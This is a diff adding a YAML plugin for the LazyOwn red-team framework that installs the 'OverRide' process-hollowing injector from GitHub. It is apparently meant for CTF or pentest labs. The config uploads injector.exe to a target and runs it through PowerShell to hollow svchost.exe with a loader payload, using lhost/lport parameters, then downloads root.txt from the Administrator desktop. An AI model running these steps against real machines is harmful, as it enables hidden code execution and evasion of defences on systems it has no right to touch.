@@ -1,0 +1,24 @@
+name: OverRide
+description: >
+  This project provides a proof-of-concept implementation of the "Process Overwriting" (a form of Process Hollowing) technique in plain C. The injector launches a legitimate target process in a suspended state and then overwrites its main executable module in memory with a custom payload. The main thread's context is then updated to point to the payload's entry point, and the process is resumed.
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport to operate.
+tool:
+  name: OverRide
+  repo_url: https://github.com/grisuno/OverRide.git
+  install_path: external/.exploit/OverRide
+  install_command: bash install.sh
+  execute_command: cowthink -bdgpstwy 'OverRide project provides a proof-of-concept implementation of the "Process Overwriting" (a form of Process Hollowing) technique in plain C. The injector launches a legitimate target process in a suspended state and then overwrites its main executable module in memory with a custom payload. The main thread's context is then updated to point to the payload's entry point, and the process is resumed.'
+  upload_file: no_priv ./external/.exploit/OverRide/injector.exe
+  remote_command: no_priv powershell .\injector.exe C:\Users\Administrator\Documents\loader_windows.exe svchost.exe
+  download_file: C:\Users\Administrator\Desktop\root.txt
